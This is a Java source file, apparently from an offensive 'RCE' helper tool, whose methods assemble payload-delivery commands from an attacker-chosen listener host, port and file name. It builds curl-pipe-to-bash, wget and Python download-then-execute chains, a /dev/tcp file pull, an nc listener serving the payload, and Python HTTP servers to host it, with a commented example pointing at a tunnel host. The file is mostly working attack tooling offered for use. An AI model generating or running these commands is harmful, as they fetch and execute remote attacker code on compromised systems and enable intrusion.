package com.swordHostDemo.controller;

import com.swordHostDemo.pojo.menuBeanListener;

/**
 * @date: 2023/1/2 14:33
 * @description:
 */
public class RceController {
    public static String cdCommand = "cd /tmp" + "\r\n";
    //Curl
    public static String Curl1Command() {
        String curl1 = "curl -fsSL http://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLport() + "/" + menuBeanListener.getFileName() + " | bash";
        return curl1;
    }

    public static String Curl2Command() {
        String curl2 = "bash < <( curl http://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLport() + "/" + menuBeanListener.getFileName()  + ")";
        return curl2;
    }

    //wget
    public static String Wget1Command() {
        String wget1 = cdCommand +
                "wget http://" + menuBeanListener.getLhost() + ":" + menuBeanListener.getLport() + "/" + menuBeanListener.getFileName()  + "\r\n" +
                "chmod +x " + menuBeanListener.getFileName()  + "\r\n" +
                "./" + menuBeanListener.getFileName() ;
        return wget1;
    }



    //Python
    public static String pythonCommand() {
        String python1 = cdCommand+
                "python -c \"import urllib.request;urllib.request.urlretrieve('http://" +
                menuBeanListener.getLhost() + ":" + menuBeanListener.getLport() + "/" + menuBeanListener.getFileName() + "','" + menuBeanListener.getFileName() + "');print('successful');\""
                + "\r\n" +
                "chmod +x " + menuBeanListener.getFileName() + "\r\n" +
                "./" + menuBeanListener.getFileName();
        return python1;
    }

    public static String python2Server(){
        String str = "python -m SimpleHTTPServer "+ menuBeanListener.getLport();
        return str;
    }

    public static  String python3Server(){
        String str = "python3 -m http.server " + menuBeanListener.getLport();
        return str;
    }

    public static String rsyncCommand(String Lhost, String Lport, String FileName){

        return null;
    }

    public static String catListener(){
        String str = "nc -lvp "+menuBeanListener.getLport()+ " < "+menuBeanListener.getFileName();
        return str;
    }

    public static String catAttack(){
        String str = "cat < /dev/tcp/"+menuBeanListener.getLhost()+"/"+menuBeanListener.getLport()+" > "+menuBeanListener.getFileName();
        return str;
    }
//    public static void main(String[] args) {
//        System.out.println(pythonCommand("61a94727.r2.cpolar.top", "80", "xts"));
//
//    }

}
